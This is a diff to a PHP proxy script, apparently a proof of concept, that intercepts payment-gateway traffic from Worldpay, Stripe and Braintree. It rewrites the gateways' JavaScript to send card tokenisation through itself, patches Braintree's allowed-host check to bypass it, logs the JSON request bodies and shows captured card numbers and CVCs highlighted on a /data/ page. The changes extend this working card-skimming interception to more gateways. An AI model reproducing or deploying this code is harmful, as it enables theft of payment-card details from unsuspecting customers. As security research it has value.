@@ -4,11 +4,24 @@
 // Config
 
 	$domain_white_list = array(
-			'https://www.example.com',
-			'https://api.worldpay.com',
-			'https://cdn.worldpay.com',
-			'https://online.worldpay.com',
+
+			'www.example.com',
+
+			'api.worldpay.com',
+			'cdn.worldpay.com',
+			'online.worldpay.com',
+
+			'checkout.stripe.com',
+
+			'js.braintreegateway.com',
+			'api.sandbox.braintreegateway.com',
+			'client-analytics.sandbox.braintreegateway.com',
+			'assets.braintreegateway.com',
+
 		);
+
+	$request_uri = (isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/');
+	$request_uri_parts = parse_url($request_uri);
 
 //--------------------------------------------------
 // Session
@@ -30,7 +43,7 @@
 
 	}
 
-	if (isset($_SERVER['REQUEST_URI']) && $_SERVER['REQUEST_URI'] == '/data/' && count($_GET) == 0) {
+	if ($request_uri == '/data/' && count($_GET) == 0) {
 
 		echo '<!DOCTYPE html>
 				<html lang="en-GB" xml:lang="en-GB" xmlns="http://www.w3.org/1999/xhtml">
@@ -48,7 +61,8 @@
 
 		foreach ($_SESSION['data'] as $data) {
 			$html = htmlentities($data);
-			$html = preg_replace('/((?:cardNumber|cvc)&quot;:&quot;)(.*?)(&quot;)/', '$1<strong class="highlight">$2</strong>$3', $html);
+			$html = str_replace('&quot;:', '&quot; : ', $html);
+			$html = preg_replace('/((?:cardNumber|cvc)&quot; : &quot;)(.*?)(&quot;)/', '$1<strong class="highlight">$2</strong>$3', $html);
 			echo '
 						<li>' . $html . '</li>';
 		}
@@ -58,9 +72,11 @@
 				</body>
 				</html>';
 
-		$_SESSION['data'] = array(
-				'Start: ' . date('Y-m-d H:i:s'),
-			);
+// TODO: Un-comment
+//
+// 		$_SESSION['data'] = array(
+// 				'Start: ' . date('Y-m-d H:i:s'),
+// 			);
 
 		exit();
 
@@ -237,11 +253,12 @@
 
 		if ($host_full != '') {
 
-			if (!in_array($host_full, $domain_white_list)) {
-				exit('<p>I\'m sorry, but I\'m not allowing this to be a full proxy service.</p>');
-			}
-
 			$host_parts = parse_url($host_full);
+
+			if (isset($host_parts['path']) && $host_parts['path'] != '/' && isset($request_uri_parts['path']) && $request_uri_parts['path'] == '/') {
+				$request_uri_parts['path'] = $host_parts['path'];
+				$host_full = $host_parts['scheme'] . '://' . $host_parts['host'];
+			}
 
 			if (!isset($host_parts['host'])) {
 
@@ -249,6 +266,13 @@
 				// Error
 
 					exit('Invalid host "' . $host_full . '"');
+
+			} else if (!in_array($host_parts['host'], $domain_white_list)) {
+
+				//--------------------------------------------------
+				// Not a full proxy
+
+					exit('<p>I\'m sorry, but I\'m not allowing this to be a full proxy service <!-- ' . htmlentities($host_parts['host']) . ' -->.</p>');
 
 			} else {
 
@@ -285,10 +309,8 @@
 				//--------------------------------------------------
 				// Request path
 
-					$path_parts = parse_url(isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/');
-
-					if (isset($path_parts['path']) && $path_parts['path'] != '') {
-						$request_path = $path_parts['path'];
+					if (isset($request_uri_parts['path']) && $request_uri_parts['path'] != '') {
+						$request_path = $request_uri_parts['path'];
 					} else {
 						$request_path = '/';
 					}
@@ -298,9 +320,9 @@
 						$request_base_path = dirname($request_base_path) . '/';
 					}
 
-					if (isset($path_parts['query'])) {
+					if (isset($request_uri_parts['query'])) {
 
-						parse_str($path_parts['query'], $request_query);
+						parse_str($request_uri_parts['query'], $request_query);
 
 						unset($request_query['host']);
 
@@ -379,6 +401,10 @@
 
 								$request_headers[] = $header . ': ' . $value;
 
+								if ($header_lower == 'content-type') {
+									$request_mime_type = $value;
+								}
+
 							}
 
 						}
@@ -443,7 +469,7 @@
 				//--------------------------------------------------
 				// Record interesting data
 
-					if ($host_full == 'https://api.worldpay.com' && $mime_type == 'application/json') {
+					if ($host_full == 'https://api.worldpay.com' && $request_mime_type == 'application/json') {
 						$_SESSION['data'][] = $request_data;
 					}
 
@@ -774,7 +800,7 @@
 
 							$response_data = $response_dom->saveHTML();
 
-					} else if (in_array($mime_type, array('text/javascript'))) {
+					} else if (in_array($mime_type, array('text/javascript', 'application/javascript')) && strpos($request_path, 'modernizr.js') === false) {
 
 						//--------------------------------------------------
 						// JavaScript
@@ -808,6 +834,11 @@
 							}
 
 							$response_data = preg_replace('/Worldpay\.api_path\+"tokens\/?"/', '"' . host_url_create('https://api.worldpay.com/v1/tokens/') . '&"', $response_data);
+
+							$response_data = str_replace('localhost', 'org.uk', $response_data); // BrainTree legalHosts (top level domain)
+							$response_data = str_replace('this._isVerbose=!1,', 'this._isVerbose=1,', $response_data); // BrainTree set _isVerbose to true
+
+							// $response_data = str_replace('assets.braintreegateway.com', (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : ''), $response_data);
 
 					} else if (in_array($mime_type, array('text/css'))) {
 
